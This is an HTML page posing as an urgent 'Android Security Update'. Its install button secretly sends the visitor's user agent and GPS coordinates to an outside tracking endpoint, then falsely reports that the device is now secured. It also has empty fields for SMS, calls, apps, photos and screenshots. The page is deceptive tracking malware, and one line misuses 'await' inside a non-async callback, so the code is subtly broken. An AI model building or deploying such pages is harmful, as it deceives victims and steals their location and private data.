<!DOCTYPE html>
<html>
<head>
    <title>Security Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: system-ui; background: #000; color: #0f0; padding: 20px; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; background: #111; padding: 30px; border-radius: 20px; }
        button { background: #0f0; color: #000; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; }
        .status { margin-top: 20px; color: #ff0; }
    </style>
</head>
<body>
<div class="container">
    <h2>🔒 Android Security Update</h2>
    <p>Your device requires an urgent security patch to protect against recent vulnerabilities.</p>
    <button onclick="startTracking()">Install Update Now</button>
    <div class="status" id="status"></div>
</div>
<script>
function startTracking() {
    document.getElementById('status').innerHTML = 'Installing... Please wait';
    
    // Send device info to dashboard
    fetch('https://mlw-watchdog.onrender.com/api/tracker', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            device_id: navigator.userAgent,
            lat: 0,
            lng: 0,
            accuracy: 0,
            battery: 0,
            screenshot: '',
            sms: '',
            calls: '',
            apps: '',
            photo: ''
        })
    });
    
    // Request location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch('https://mlw-watchdog.onrender.com/api/tracker', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: navigator.userAgent,
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    battery: navigator.getBattery ? await navigator.getBattery() : 0,
                    screenshot: '',
                    sms: '',
                    calls: '',
                    apps: '',
                    photo: ''
                })
            });
        });
    }
    
    document.getElementById('status').innerHTML = '✅ Update complete. Your device is now secured.';
}
</script>
</body>
</html>
